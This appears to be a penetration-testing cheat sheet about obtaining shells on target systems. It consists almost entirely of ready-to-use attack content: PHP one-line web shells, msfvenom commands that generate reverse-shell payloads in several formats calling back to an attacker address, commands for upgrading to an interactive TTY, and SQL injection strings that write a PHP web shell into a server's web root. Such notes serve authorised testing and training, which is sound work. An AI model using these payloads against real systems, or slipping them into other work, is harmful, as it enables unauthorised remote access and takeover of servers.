# Information About Shells

```
-----------------------------------------------------

PHP
<?php system($_GET["cmd"]); ?>
<?php echo shell_exec($_GET["cmd"]); ?>

-----------------------------------------------------
Reverse Shell 

http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet 

-----------------------------------------------------

Msfvenom
#Linux
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=443 -f elf > shell.elf
# PHP
msfvenom -p php/meterpreter_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f raw > shell.php
# ASP
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=443 -f asp > shell.asp
# WAR
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f war > shell.war
# JSP
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f raw > shell.jsp
# Exe
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=445 -f exe -o shell_reverse.exe

-----------------------------------------------------

Interactive TTY Shell
# python
python -c 'import pty; pty.spawn("/bin/sh")'
# Echo
echo 'os.system('/bin/bash')'
# sh
/bin/sh -i
# bash
/bin/bash -i

-----------------------------------------------------

Shell From SQL Injection
# windows
?id=1 union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6,7,8,9 into OUTFILE 'c:/xampp/htdocs/cmd.php'
# linux
?id=1 union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6,7,8,9 into OUTFILE '/var/www/html/cmd.php'
```
